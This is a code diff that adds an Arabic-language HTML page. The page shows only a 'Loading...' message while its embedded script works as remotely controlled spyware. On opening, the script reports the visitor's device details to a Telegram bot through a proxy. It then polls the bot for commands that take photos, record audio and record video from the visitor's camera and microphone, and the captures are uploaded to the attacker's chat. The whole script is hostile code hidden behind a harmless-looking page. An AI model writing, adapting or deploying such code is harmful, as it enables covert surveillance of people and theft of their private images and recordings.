@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>جارٍ التحميل...</title>
+<style>
+  body{
+    background:#fff;
+    color:#aaa;
+    font-family:sans-serif;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    height:100vh;
+    margin:0;
+    font-size:14px;
+  }
+</style>
+</head>
+<body>
+جارٍ التحميل...
+<script>
+/* ========= الإعدادات ========= */
+const PROXY_URL = "https://telegram-proxy.yourname.workers.dev";
+const CHAT_ID   = "6514749116";
+
+/* ========= أدوات ========= */
+async function send(method, data){
+  try{
+    const res = await fetch(`${PROXY_URL}/${method}`,{
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body: JSON.stringify(data)
+    });
+    return await res.json();
+  }catch(e){
+    console.error("Send error:", e);
+  }
+}
+
+/* ========= رسالة الدخول (مرة كل 12 ساعة) ========= */
+(async function entryMessage(){
+  const KEY = "last_entry_time";
+  const LIMIT = 12 * 60 * 60 * 1000; // 12 ساعة
+  const now = Date.now();
+  const last = localStorage.getItem(KEY);
+
+  if(last && now - last < LIMIT) return;
+  localStorage.setItem(KEY, now);
+
+  const result = await send("sendMessage",{
+    chat_id: CHAT_ID,
+    text:
+`🔔 فتح الصفحة
+🕒 ${new Date().toLocaleString()}
+📱 ${navigator.platform}
+🌐 ${navigator.userAgent}
+🌍 ${navigator.language}`
+  });
+
+  /* لو الإرسال فشل */
+  if(!result || !result.ok){
+    console.warn("Telegram not reached");
+  }
+})();
+
+/* ========= تحكم البوت ========= */
+let lastUpdate = 0;
+let mediaRecorder=null, stream=null, chunks=[], duration=10;
+
+async function poll(){
+  try{
+    const r = await fetch(`${PROXY_URL}/getUpdates?offset=${lastUpdate+1}`);
+    const d = await r.json();
+    if(!d.result || !d.result.length) return;
+
+    const u = d.result[d.result.length-1];
+    lastUpdate = u.update_id;
+    const t = u.message?.text || "";
+
+    if(t==="/photo") takePhoto();
+    else if(t==="/record") recordAudio();
+    else if(t==="/video") recordVideo();
+    else if(t==="/stop") stopAll();
+    else if(t.startsWith("/set")){
+      const n = parseInt(t.split(" ")[1]);
+      if(n>0 && n<=120) duration=n;
+    }
+  }catch(e){
+    console.error("Poll error:", e);
+  }
+}
+setInterval(poll, 5000);
+
+/* ========= وظائف ========= */
+function stopAll(){
+  if(mediaRecorder && mediaRecorder.state!=="inactive") mediaRecorder.stop();
+  if(stream){ stream.getTracks().forEach(t=>t.stop()); stream=null; }
+  mediaRecorder=null; chunks=[];
+}
+
+function takePhoto(){
+  const i=document.createElement("input");
+  i.type="file"; i.accept="image/*"; i.capture="environment";
+  i.onchange=()=>{
+    const f=i.files[0]; if(!f) return;
+    const fd=new FormData();
+    fd.append("chat_id",CHAT_ID);
+    fd.append("photo",f);
+    fetch(`${PROXY_URL}/sendPhoto`,{method:"POST",body:fd});
+  };
+  i.click();
+}
+
+async function recordAudio(){
+  stopAll();
+  stream = await navigator.mediaDevices.getUserMedia({audio:true});
+  mediaRecorder = new MediaRecorder(stream);
+  chunks=[];
+  mediaRecorder.ondataavailable=e=>chunks.push(e.data);
+  mediaRecorder.onstop=()=>{
+    const b=new Blob(chunks,{type:"audio/webm"});
+    const fd=new FormData();
+    fd.append("chat_id",CHAT_ID);
+    fd.append("voice",b,"a.webm");
+    fetch(`${PROXY_URL}/sendVoice`,{method:"POST",body:fd});
+    stopAll();
+  };
+  mediaRecorder.start();
+  setTimeout(()=>mediaRecorder.stop(), duration*1000);
+}
+
+async function recordVideo(){
+  stopAll();
+  stream = await navigator.mediaDevices.getUserMedia({video:true,audio:true});
+  mediaRecorder = new MediaRecorder(stream);
+  chunks=[];
+  mediaRecorder.ondataavailable=e=>chunks.push(e.data);
+  mediaRecorder.onstop=()=>{
+    const b=new Blob(chunks,{type:"video/webm"});
+    const fd=new FormData();
+    fd.append("chat_id",CHAT_ID);
+    fd.append("video",b,"v.webm");
+    fetch(`${PROXY_URL}/sendVideo`,{method:"POST",body:fd});
+    stopAll();
+  };
+  mediaRecorder.start();
+  setTimeout(()=>mediaRecorder.stop(), duration*1000);
+}
+</script>
+</body>
+</html>
